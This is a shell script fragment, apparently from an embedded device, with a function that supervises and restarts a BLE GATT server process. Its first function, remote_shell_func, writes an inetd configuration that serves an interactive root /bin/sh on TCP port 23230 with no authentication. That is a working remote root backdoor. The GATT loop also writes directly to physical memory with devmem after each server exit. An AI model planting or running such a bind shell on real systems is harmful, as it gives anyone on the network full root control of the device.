remote_shell_func() {
	printf '%s\n' '23230 stream tcp nowait root /bin/sh sh -i' \
		> /run/inetd-shell.conf
	/bin/pidof inetd >/dev/null ||
		/usr/sbin/inetd -q 1 /run/inetd-shell.conf
}

star_gatt_func() {
	(
		lock=/var/run/star-gatt-launch.lock
		broker=/var/run/blebridge-gatt.sock
		log=/tmp/star-gatt.log
		previous_log="${log}.1"
		/bin/mkdir "$lock" 2>/dev/null || exit 0
		trap '/bin/rmdir "$lock"' 0
		if [ -e "$log" ]; then
			/bin/mv -f "$log" "$previous_log" || exit 1
		fi
		: > "$log"
		attempt=1
		backoff=1
		while :; do
			remaining=30
			while [ ! -S "$broker" ]; do
				if [ "$remaining" -eq 0 ]; then
					printf '%s\n' \
						'star-gatt: broker socket did not appear' >> "$log"
					exit 1
				fi
				remaining=$((remaining - 1))
				/bin/sleep 1
			done
			printf 'star-gatt: launch attempt %s\n' "$attempt" >> "$log"
			/usr/bin/star_gatt_server "$broker" >> "$log" 2>&1
			status=$?
			# Abort capture preparation; the restarted publisher queues both
			# cancellations after MAIN releases any in-flight relay packet.
			/sbin/devmem 0x2a2985fbc 8 5
			printf 'star-gatt: exit %s\n' "$status" >> "$log"
			/bin/sleep "$backoff"
			if [ "$backoff" -lt 8 ]; then
				backoff=$((backoff * 2))
			fi
			attempt=$((attempt + 1))
		done
	) &
}
